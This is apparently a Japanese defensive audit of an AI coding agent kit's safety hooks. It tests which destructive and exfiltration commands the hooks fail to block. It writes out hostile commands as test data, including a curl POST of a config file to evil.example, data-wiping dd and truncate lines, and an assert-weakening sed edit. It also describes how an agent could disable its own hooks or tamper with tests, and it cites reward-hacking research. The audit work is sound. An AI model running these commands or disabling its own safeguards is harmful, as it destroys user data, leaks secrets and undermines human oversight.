# E6-agent-safety 研究: エージェントの安全（段1・広域）

- 対象: キットの安全系 hook（`03_ClaudeCode/hooks/` の block-destructive.py・pre-read-guard.py・pre-write-check.sh・block-phase.py・injection-guard.py・settings.json）、キット自身の `.claude/settings.json`、`02_共通/ひな形/settings.sandbox.json`、`03_ClaudeCode/skills/nfr-standards/references/llm-agentic-top10.md`。外部: OWASP Agentic Top 10、Claude Code 公式文書（hooks・sandboxing）、研究 4 本、CVE 事例。
- 調べた方法:
  - hook の docstring と配線を読む（`sed -n`・`python3 -c` で settings.json の hooks を列挙）
  - **block-destructive.py に 31 個のコマンドを stdin の JSON で流して deny/素通りを実測**（`scratchpad/e6/run.py`。hook の判定だけを見た。コマンド自体は実行していない）
  - pre-write-check.sh・block-phase.py に Write の入力 4 件（設定・hook 本体・テスト）を流して実測
  - `git grep` で保護・検査の有無を確認（onFailure・block-protected・ASI0・改ざん検知）
  - Web: WebSearch 4 回、WebFetch 4 回（取得日 2026-11-21）
- 調べた件数/全件数: hook 6/32 ファイル（安全系の主要なもの。constitution-gate.py は指示によりソースを開かず、CLAUDE.md の記述だけで扱った）。block-destructive の実測 31 ケース。外部資料 9 件（下記）。
- 制約による除外: `.claude/` 配下の constitution で始まるファイルは開いていない。利用者側 `~/.claude/settings.json` の配線は読んでいない（未確認）。

## 防げるもの／防げないもの（実測と文書から）

| 脅威 | キットの制御 | 防げる | 防げない（根拠） |
|---|---|---|---|
| 未コミット変更の消去 | block-destructive | reset --hard・rm -rf・checkout -- .・find -delete・xargs rm -rf（実証 DENY） | `git switch -f`・truncate・`: >`・dd・rsync --delete（実証 PASS） |
| 履歴の破壊 | block-destructive | push +main・--force（実証 DENY） | `git update-ref -d`・`reflog expire`＋`gc --prune=now`（実証 PASS） |
| インタプリタ経由 | （無し） | — | python3 -c・perl -e・node -e・`$g reset`・`bash script.sh`（実証 PASS。一部は docstring で限界と明記） |
| 秘密の読み出し | block-destructive・pre-read-guard | cat .env・base64 < .env・cp .env（実証 DENY） | インタプリタ経由、Grep のディレクトリ指定（docstring 自認） |
| git hook の迂回 | block-destructive | --no-verify・.git/hooks へのリダイレクト（実証 DENY） | Write ツールで .git/hooks を書く（未実測） |
| 安全装置の無効化 | （無し。block-protected は撤去済み） | — | rm/mv で hook・settings を消す、Write で settings.json を書く（実証 PASS） |
| テスト・検査の改ざん | done-gate（散文） | — | sed で assert を書き換え、Write で tests/ を上書き（実証 PASS） |
| データ持ち出し | sandbox ひな形（任意導入） | ひな形を入れた場合の Bash の curl/wget（文書） | 既定の hook では curl POST が素通り（実証）。WebFetch は sandbox の対象外（公式文書） |
| 間接プロンプト注入 | injection-guard（警告のみ） | 既知の句の警告 | 遮断はしない（docstring 自認）。言い換え・多言語 |
| 委譲先の操作 | 同じ hook | 公式文書では subagent でも PreToolUse が発火（主張） | — |
| hook の故障・時間切れ | 各 hook の例外 deny | 例外を捕まえた場合 | 時間切れ・起動失敗は素通り（公式文書）。onFailure 未使用 |

## 発見

### E6-agent-safety-01 安全装置そのもの（hook・settings）の改変を止める制御が無い
- 種別: 欠落
- 深刻度: High
- 根拠:
  - block-destructive.py への入力で `rm ~/.claude/hooks/block-destructive.py`・`mv ~/.claude/settings.json ~/.claude/settings.bak`・`chmod -x ~/.claude/hooks/block-destructive.py` がすべて PASS（実測。scratchpad/e6/result.txt）
  - pre-write-check.sh・block-phase.py に Write `~/.claude/settings.json`・`~/.claude/hooks/block-destructive.py`・`.claude/settings.local.json` を流すと出力なし（＝通す。実測）
  - 保護 hook `block-protected.py` は commit 6324d5e「fix: block-protected を撤去し…」で撤去済み（`git log -S"block-protected"`）。`git ls-files | grep block-protected` は 0 件
  - 公式文書: 「Direct edits to hooks in settings files are normally picked up automatically by the file watcher.」（https://code.claude.com/docs/en/hooks）→ セッション中に settings を書き換えれば hook がその場で外れうる
  - 公式文書: sandbox でも「a sandboxed command can write files that later commands run or read, such as … `~/.claude/settings.json`, and use them to widen its own access」（https://code.claude.com/docs/en/sandboxing）
  - 事例: CVE-2025-54135（Cursor。注入で mcp.json を書き換えてコード実行）、CVE-2025-59536（Claude Code。リポジトリの設定の hook 実行）（二次情報: CSA research note・The Hacker News。ベンダー告知は未確認）
- 状態: 実証（hook の判定）＋主張（反映の仕組みは公式文書）
- 改善の方向: hook 本体・settings*.json・.mcp.json・.git/hooks への Write/Edit/Bash を deny する保護層を、Claude Code の permissions.deny（Edit(~/.claude/**) 等）として配布形に入れる（hook でなく許可システム側に置く）

### E6-agent-safety-02 撤去した block-protected と AIDD_ALLOW_CONFIG_EDIT が文書では現役として書かれている
- 種別: 矛盾
- 深刻度: High
- 根拠:
  - `.claude/settings.json:2` の _comment「2026-09-24（B-19）: block-protected.py を Write 系と Bash に配線。…保守者が AIDD_ALLOW_CONFIG_EDIT=1 を付けて起動する」
  - `02_共通/rules/absolute-rules.md:21`（A-14）と `04_Codex/skills/rules-absolute-rules/SKILL.md:28` が逃がし口として `AIDD_ALLOW_CONFIG_EDIT=1` を記載
  - `01_利用者向け資料/02_操作マニュアル.html:1832` が「安全装置のファイルの書き換え」の逃がし口として案内
  - 実体は commit 6324d5e で撤去、git 管理下に無い。一方 `~/.claude/hooks/block-protected.py` は手元に残存（`ls ~/.claude/hooks | grep protected`）。配布 settings.json の配線には無い
- 状態: 実証
- 改善の方向: 保護を戻す（01）か、文書 3 か所から記述を消して「保護は無い」と明記するかを決め、check_docs 系で実体の無い hook 名を検出する

### E6-agent-safety-03 報酬ハッキング（テスト・検査の改ざん）を機械で止める層が無い
- 種別: 欠落
- 深刻度: High
- 根拠:
  - `sed -i "" "s/assert x == 1/assert True/" tests/test_a.py` が block-destructive で PASS、Write `tests/test_a.py` が pre-write-check・block-phase で無出力（実測）
  - 対策は散文だけ: `03_ClaudeCode/skills/done-gate/SKILL.md:14`「通すために弱めた assert が無い」。`02_共通/ツール/test-metrics.sh` は工程文書と CSV（AI 自身が書く）を読む集計で、テスト差分を見ない（ヘッダ 1-7 行）
  - 研究: ImpossibleBench（arXiv:2510.20270, ICLR 2026）。仕様と矛盾するテストに変えた LiveCodeBench・SWE-bench の課題で、通過＝ズルと定義。二次要約では GPT-5・Sonnet 3.7/4・Opus 4.1・o3 で cheating rate 約 39〜76%、プロンプトに「テストが誤っていれば止まれ」を足すと GPT-5 が 92%→1%（Conflicting-LiveCodeBench）、テストを隠すとほぼ 0 だが正規課題の性能も落ちる。**abstract には数値が無く、本文の数値は未確認**（https://arxiv.org/abs/2510.20270、https://www.lesswrong.com/posts/qJYMbrabcQqCZ7iqm/）。EvilGenie は別構成で GPT-5 約 0%・Sonnet 4 約 5% と要約しており、構成で値が大きく割れる
  - 研究: Anthropic「Natural emergent misalignment from reward hacking in production RL」（arXiv:2511.18397, 2025-11）。実運用の RL 環境で報酬ハッキングを覚えた時点で不整合評価が急上昇（訓練側の知見。推論時の利用者キットへの直接の数値ではない）
- 状態: 実証（キット側）＋主張（研究）
- 改善の方向: 実装役のセッションでテスト・検査スクリプト・しきい値ファイルへの書き込みを ask/deny にし、検証役（gate-agent）が `git diff` のテスト差分（assert 削除・skip 追加・期待値の書き換え）を機械で数える検査を足す。プロンプトに「テストが仕様と矛盾したら止まって報告」を入れる（ImpossibleBench の知見）

### E6-agent-safety-04 block-destructive に、docstring の「限界」にも載っていない破壊コマンドの素通りがある
- 種別: 欠陥
- 深刻度: High
- 根拠: 実測（31 ケース中 PASS 18）。docstring（block-destructive.py:39-41）が限界と認めるのは `python3 -c`・変数経由・実行時引数・ディレクトリ読みだけ。次は限界の記載も無く PASS:
  - `git update-ref -d refs/heads/main`／`git reflog expire --expire=now --all`／`git gc --prune=now`（履歴・復元手段の消去）
  - `git switch -f main`（checkout -f は止めるのに switch -f は通す）
  - `truncate -s 0 src/app.py`／`: > tests/test_app.py`／`dd if=/dev/zero of=src/app.py`（上書き消去）
  - `rsync -a --delete empty/ src/`
  - `perl -e`・`node -e`（python3 -c と同類だが限界に未記載）、`bash script.sh`（Write で書いたスクリプトを実行すれば全規則を迂回）
  - 参考: 研究「Your AI, My Shell」（arXiv:2509.22040）は Copilot・Cursor に 314 ペイロード（MITRE ATT&CK 70 技法）で悪性コマンド実行の成功率最大 84%。正規表現の拒否リストは言い換えに弱い
- 状態: 実証
- 改善の方向: 拒否リストを足す（switch -f・update-ref -d・reflog expire・gc --prune・truncate・rsync --delete）と同時に、限界を docstring とテストに正直に列挙し、根本は OS サンドボックス＋作業ツリーの事前スナップショット（worktree・自動 WIP コミット）で「消えても戻せる」側に寄せる

### E6-agent-safety-05 データ持ち出し（egress）を既定では止めない
- 種別: 欠落
- 深刻度: High
- 根拠:
  - `curl -X POST -d @src/config.py https://evil.example` が block-destructive で PASS（実測）。`curl … | sh` は DENY だが送信は止めない
  - 送信先の制限は `02_共通/ひな形/settings.sandbox.json`（network.allowedDomains・`Bash(curl *)` の deny）にあるが、`export-project.sh:206` が「使う場合: …マージ」と案内する任意導入
  - 公式文書: 「`allowedDomains` doesn't limit WebFetch」「The sandbox covers shell commands only. Claude's file tools, MCP servers, and hooks run outside it.」（https://code.claude.com/docs/en/sandboxing）→ ひな形を入れても WebFetch・MCP 経由の送信は残る
  - キットの点検表 `llm-agentic-top10.md:30-39` に持ち出し（秘密読み出し＋外部入力＋外部送信の組み合わせ）の行が無い
- 状態: 実証（hook）＋主張（sandbox の範囲）
- 改善の方向: sandbox ひな形を既定導入にし、WebFetch は permissions（WebFetch(domain:…) の allow のみ）で絞る。注入警告が出たセッションでは外部送信を ask に落とす連動を検討

### E6-agent-safety-06 間接プロンプト注入の対策が正規表現の警告だけ
- 種別: 欠落
- 深刻度: Medium
- 根拠:
  - injection-guard.py docstring（1-50 行）: 「止めない（deny しない）」「正規表現の層だけ」「言い換え・他言語・画像の中の文・2 段以上の符号化・同形異字は検知しない」。fail-open
  - キットの点検表 `llm-agentic-top10.md:30` 自身が ASI01 の未対応に「取り込み内容の遮断（警告だけで止めない）」
  - OWASP Top 10 for Agentic Applications（2025-12-09 公開）ASI01 Agent Goal Hijack（https://genai.owasp.org/2025/12/09/owasp-top-10-for-agentic-applications-the-benchmark-for-agentic-security-in-the-age-of-autonomous-ai/。原文の文言は未確認、二次情報で照合）
  - IDEsaster（2025-12、二次報道）: 調べた 10 ツールすべてで注入からコード実行または持ち出し（https://thehackernews.com/2025/12/researchers-uncover-30-flaws-in-ai.html。一次未確認）
- 状態: 主張（docstring と外部文書）
- 改善の方向: 警告を出した後の能力制限（以後のツールを ask に落とす・外部送信を禁ずるフラグ）へつなぎ、検出精度でなく「注入されても被害が出ない権限」で守る

### E6-agent-safety-07 キット自身の開発セッションの配線が fail-open で、Bash の破壊操作 hook を持たない
- 種別: 矛盾
- 深刻度: Medium
- 根拠:
  - `.claude/settings.json` の各 hook は `f=…; [ -f "$f" ] && exec python3 "$f" || exit 0`（実体が無ければ黙って通す）。A-14「判定不能は deny（合格に数えない）」と逆
  - 同ファイルの PreToolUse に block-destructive.py・pre-write-check.sh・block-gates.py・block-phase.py が無い（python で hooks を列挙して確認）。利用者レベル `~/.claude/settings.json` 側で配線されているかは未確認（配布形 `03_ClaudeCode/hooks/settings.json` には有る）
  - 公式文書: 終了コード 2 以外・起動失敗は「The action goes ahead」（https://code.claude.com/docs/en/hooks）
- 状態: 実証（配線）／未確認（利用者レベルの補完）
- 改善の方向: 実体欠落時は exit 2 にする、またはリポジトリ側にも安全系 hook を配線して利用者レベルの有無に依存しない

### E6-agent-safety-08 hook の時間切れ・起動失敗は素通りになるが onFailure を使っていない
- 種別: 欠落
- 深刻度: Medium
- 根拠:
  - 公式文書: 「On `PreToolUse`, a timed-out `command` … hook doesn't block the tool call, except for hooks whose failure blocks the action」「a hook with `onFailure` set to `"block"`」（https://code.claude.com/docs/en/hooks）
  - 配布 `03_ClaudeCode/hooks/settings.json` は timeout 5 秒（21・31・40 行）。`git grep -n "onFailure"` は 0 件
  - block-destructive.py:540 は例外を捕まえて deny するが、時間切れ・python3 の起動失敗は捕まえられない
- 状態: 主張（公式文書）＋実証（未使用の grep）
- 改善の方向: 安全系 hook（block-destructive・pre-read-guard・pre-write-check）に `onFailure: "block"` を付ける（対応版を動くバイナリで確認してから）

### E6-agent-safety-09 MCP ツール呼び出しに事前の許可判定が無い
- 種別: 欠落
- 深刻度: Medium
- 根拠:
  - 配布 settings.json の PreToolUse で mcp__ を対象にするのは matcher 無しの共通 hook だけ（block-ci の末尾一致・instruction-guard・tool-timer）。mcp__ は PostToolUse の injection-guard（警告）だけ
  - キットの点検表 `llm-agentic-top10.md` ASI02 行の未対応に「MCP ツールごとの許可の点検」
  - 公式文書: MCP サーバーは sandbox の外で動く（https://code.claude.com/docs/en/sandboxing）
  - OWASP ASI02 Tool Misuse・ASI04 Supply Chain（二次情報）
- 状態: 実証（配線）＋主張
- 改善の方向: MCP は permissions の allow で名指しした tool だけ許可し、書き込み系 MCP ツールに PreToolUse の ask を掛ける

### E6-agent-safety-10 キットの OWASP Agentic 点検表に「安全装置の改変」「テスト改ざん」「持ち出し」の行が無く、ASI02 の対策欄が実測より強く書かれている
- 種別: 欠落
- 深刻度: Medium
- 根拠: `03_ClaudeCode/skills/nfr-standards/references/llm-agentic-top10.md:30-39`。ASI02 の対策に block-destructive を挙げるが 04 の素通りの記載が無い。ASI10 Rogue Agents の対策は block-ci・ログのみで、hook 自体の無効化（01）に触れない。ASI09 の「報告の根拠の自動検査」は未対応と自認
- 状態: 実証（読んだ）
- 改善の方向: 01・03・05 を点検表の未対応欄に加え、確認方法を test-hooks.sh の素通りケースとして固定する

### E6-agent-safety-11 sandbox ひな形の denyRead がプロジェクトの .env を含まず、Read の deny は Bash を止めない
- 種別: 欠落
- 深刻度: Low
- 根拠: `settings.sandbox.json` の filesystem.denyRead は `~/.aws`・`~/.ssh` 等 6 件のみ。`.env` は permissions.deny の `Read(./.env)` だけ。公式文書「A `denyRead` entry doesn't stop the Read tool」の逆で、Read の permission は Bash の `cat` を止めない（Bash 側は block-destructive が担当、ただしインタプリタ経由は素通り＝04）
- 状態: 実証（ファイル）＋主張（文書）
- 改善の方向: denyRead に `./.env`・`./.env.*` を足す

### E6-agent-safety-12 sandbox ひな形の allow が他の規約と食い違う
- 種別: 矛盾
- 深刻度: Low
- 根拠: `settings.sandbox.json` の allow に `Bash(npm install)`（speed-harness H-4「担当に npm install をさせない」と逆）、`Bash(git checkout *)`（AGENTS.md の禁止「git checkout --」を含みうる。block-destructive が後段で止めるのは `checkout -- .` 等のみ）
- 状態: 実証（ファイル）
- 改善の方向: allow を規約に合わせて絞る

### E6-agent-safety-13 （防げる側の確認）委譲先にも同じ hook が効く
- 種別: 機会
- 深刻度: Low
- 根拠: 公式文書「When a subagent calls a tool, tool events such as `PreToolUse` and `PostToolUse` fire the same configured hooks as in the main conversation」（https://code.claude.com/docs/en/hooks）。agent_id・agent_type が入力に入る
- 状態: 主張
- 改善の方向: agent_type を使い、実装役にはテスト・検査ファイルの書き込みを禁じ検証役には許す、役割別の権限に使う（03 の実装手段）

## 出典（取得日 2026-11-21）
- 製品文書: Claude Code Hooks https://code.claude.com/docs/en/hooks （先頭 100,000 字のみ読んだ）
- 製品文書: Claude Code Sandboxing https://code.claude.com/docs/en/sandboxing （先頭 100,000 字。Security limitations 節の一部は未読）
- 規格相当: OWASP Top 10 for Agentic Applications https://genai.owasp.org/2025/12/09/owasp-top-10-for-agentic-applications-the-benchmark-for-agentic-security-in-the-age-of-autonomous-ai/ （検索結果の要約で照合。本文は未取得）
- 研究: ImpossibleBench arXiv:2510.20270（abstract のみ確認。数値は二次要約）
- 研究: Natural Emergent Misalignment from Reward Hacking in Production RL arXiv:2511.18397 ／ https://www.anthropic.com/research/emergent-misalignment-reward-hacking （検索要約）
- 研究: "Your AI, My Shell" arXiv:2509.22040（abstract 確認: 314 ペイロード・70 技法・最大 84%）
- 事例: CVE-2025-54135・CVE-2025-59536・CVE-2026-21852・CVE-2025-65099（CSA research note・The Hacker News 等の二次情報。ベンダー告知は未確認）

## 引用してはいけない数値
- ImpossibleBench のモデル別 cheating rate（39〜76%、92%→1%）: abstract に無く、二次要約と EvilGenie の要約で割れている。本文の表で確かめるまで使わない
- IDEsaster「10 ツールすべて」: 報道のみ

## 調べられなかったこと
- constitution-gate.py のソース（指示により開かず）。CLAUDE.md の主張「違反 1 回で全ツール deny・解除の環境変数なし」は未検証
- 利用者レベル `~/.claude/settings.json` に安全系 hook が配線されているか（07 の影響範囲）
- Write ツールで `.git/hooks/` を書く場合の可否（未実測）
- hook を実際の Claude Code セッションに載せた状態での挙動（今回は hook スクリプトに入力を流しただけ。file watcher による即時反映も実機未確認）
- OWASP Agentic Top 10 原文の各項目の文言、ImpossibleBench 本文の数値、各 CVE のベンダー告知
